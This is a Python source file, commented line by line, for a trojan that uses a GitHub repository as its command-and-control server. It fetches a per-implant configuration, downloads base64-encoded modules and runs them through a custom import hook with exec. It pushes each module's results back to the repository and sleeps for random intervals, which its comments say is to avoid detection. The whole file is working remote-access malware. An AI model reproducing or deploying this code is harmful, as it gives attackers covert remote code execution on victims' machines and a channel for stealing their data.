import base64
import json
import queue
import random
import sys
import threading
import time
import types
from datetime import datetime

from github3 import login

# Define a unique identifier for the trojan instance
trojan_id = "abc"

# Define file paths for configuration and data storage, using the trojan_id
trojan_config = "config/{}.json".format(trojan_id)
data_path = "data/{}/".format(trojan_id)

# List to store loaded trojan modules
trojan_modules = []

# Flag to indicate if the trojan has been configured
configured = False

# Queue to manage tasks for module execution
task_queue = queue.Queue()

# Custom module importer to dynamically load modules from a GitHub repository
class GitImporter(object):
    def __init__(self):
        # Initialize an empty string to store the module code
        self.current_module_code = ""

    # Method to locate a module in the GitHub repository
    def find_module(self, fullname, path=None):
        # Only attempt to retrieve the module if the trojan is configured
        if configured:
            print("[*] Attempting to retrieve %s" % fullname)
            # Retrieve the module file from the 'modules/' directory in the repository
            new_library = get_file_contents("modules/%s" % fullname)
            if new_library:
                # Decode the base64-encoded content retrieved from GitHub
                self.current_module_code = base64.b64decode(new_library)
                return self  # Return the importer instance if the module is found
        return None  # Return None if the module is not found or not configured

    # Method to load the module into the Python environment
    def load_module(self, name):
        # Create a new module object with the given name
        module = types.ModuleType(name)
        # Execute the module code in the module's namespace
        exec(self.current_module_code, module.__dict__)
        # Add the module to the system modules dictionary
        sys.modules[name] = module
        return module  # Return the loaded module

# Function to authenticate and connect to the GitHub repository
def connect_to_github():
    # Log in to GitHub using a personal access token
    gh = login(username="*", password="*")
    # Access the specified repository
    repo = gh.repository("*", "*")
    # Retrieve branch of the repository
    branch = repo.branch("*")
    return gh, repo, branch  # Return the GitHub session, repository, and branch objects

# Function to retrieve file contents from the GitHub repository
def get_file_contents(filepath):
    # Connect to GitHub and get repository details
    gh, repo, branch = connect_to_github()
    # Recursively fetch the commit tree of the master branch
    tree = branch.commit.commit.tree.to_tree().recurse()
    # Iterate through all files in the repository tree
    for filename in tree.tree:
        # Check if the requested filepath exists in the repository
        if filepath in filename.path:
            print("[*] Found file %s" % filepath)
            # Retrieve the file's content using its SHA
            blob = repo.blob(filename._json_data['sha'])
            return blob.content  # Return the base64-encoded content
    return None  # Return None if the file is not found

# Function to retrieve and parse the trojan's configuration from the repository
def get_trojan_config():
    global configured
    # Retrieve the configuration file from GitHub
    config_json = get_file_contents(trojan_config)
    # Decode and parse the JSON configuration
    configuration = json.loads(base64.b64decode(config_json))
    # Mark the trojan as configured
    configured = True

    # Dynamically import any new modules specified in the configuration
    for tasks in configuration:
        if tasks['module'] not in sys.modules:
            exec("import %s" % tasks['module'])  # Import the module dynamically

    return configuration  # Return the parsed configuration

# Function to store module execution results in the GitHub repository
def store_module_result(data):
    # Connect to GitHub
    gh, repo, branch = connect_to_github()
    # Generate a timestamp for the result file
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    # Define the remote path for storing the result
    remote_path = "data/%s/%s.data" % (trojan_id, current_time)
    # Create a new file in the repository with the result data
    repo.create_file(remote_path, f"Commit in {current_time}", data.encode())
    return

# Function to execute a module and store its results
def module_runner(module):
    # Add a task to the queue to indicate the module is running
    task_queue.put(1)
    # Execute the module's 'run' function
    result = sys.modules[module].run()
    # Remove the task from the queue after completion
    task_queue.get()

    # Store the module's result in the GitHub repository
    store_module_result(result)
    return

# Main trojan loop
# Register the custom GitImporter to handle dynamic module loading
sys.meta_path = [GitImporter()]

# Continuously run the trojan
while True:
    # Check if there are no tasks in the queue
    if task_queue.empty():
        # Retrieve the latest configuration from the repository
        config = get_trojan_config()
        # Iterate through each task in the configuration
        for task in config:
            # Create a new thread to run the module
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()  # Start the thread
            # Random delay between starting modules to avoid detection
            time.sleep(random.randint(1, 10))
    # Random delay between configuration checks to reduce network activity
    time.sleep(random.randint(1000, 10000))